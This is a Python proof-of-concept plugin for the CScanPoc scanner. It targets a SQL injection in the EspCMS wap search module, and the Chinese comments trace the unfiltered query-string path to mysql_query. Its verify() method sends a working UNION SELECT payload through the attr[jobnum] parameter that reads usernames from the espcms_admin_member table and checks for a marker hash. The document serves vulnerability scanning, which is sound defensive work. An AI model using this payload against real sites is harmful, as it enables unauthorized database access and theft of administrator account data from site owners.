# coding: utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'EspCMS_0021'  # 平台漏洞编号，留空
    name = 'EspCMS搜索处 wap模块SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-07-25'  # 漏洞公布时间
    desc = '''
        变量的传递过程是$_SERVER['QUERY_STRING']->$urlcode->$output->$value->$db_where->$sql->mysql_query，整个过程无过滤导致了注入的发生。
        正因为变量是从$_SERVER['QUERY_STRING']中去取的，所以正好避开了程序的过滤。
        而注入的变量是数组的值，并非数组的key，所以也没过被过滤，综合起来形成了一个比较少见的SQL注入。
        在/interface/3gwap_search.php文件的in_result函数中。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/626/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'EspCMS(易思CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c7eef2ee-3772-4550-bdcb-23d3cce0c7ed'  # 平台 POC 编号，留空
    author = '47bwy'  # POC编写者
    create_date = '2018-06-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/wap/index.php?ac=search&at=result&lng=cn&mid=3&tid=11&keyword=1&keyname=a.title&countnum=1&attr[jobnum]=1%27%20and%201=2%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,concat%28username,CHAR%2838%29,md5%28c%29%29,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45%20from%20espcms_admin_member;%23"
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
